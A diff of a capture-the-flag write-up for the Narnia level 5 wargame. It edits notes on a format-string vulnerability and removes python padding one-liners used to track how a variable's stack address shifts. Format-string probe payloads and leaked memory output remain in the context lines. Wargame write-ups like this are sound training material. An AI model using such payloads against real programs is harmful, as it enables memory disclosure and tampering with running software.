@@ -294,14 +294,7 @@ Change i's value from 1 -> 500. No way...let me give you a hint!
 buffer : [f7fc7500.30303537.3330332e] (26)
 i = 1 (0xffffd3b0)
 ```
-which indicates a format string vulnerability since addresses like f7fc7500 are being leaked from the buffer output.
-I noticed that the address of i changed depending on the payload the program was given.
-Base address was 0xffffd380
-Starting from $(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72)'), every 16 characters, address of i decrements by 10
-'$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72)')' -> 0xffffd370
-'$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*88)')' -> 0xffffd360
-
-Using the following payload:
+which indicates a format string vulnerability since addresses like f7fc7500 are being leaked from the buffer output. Using the following payload:
 ```bash
 narnia5@gibson:/narnia$ ./narnia5 AAAA.%x.%x.%x.%x.%x.%x.%x.%x
 Change i's value from 1 -> 500. No way...let me give you a hint!
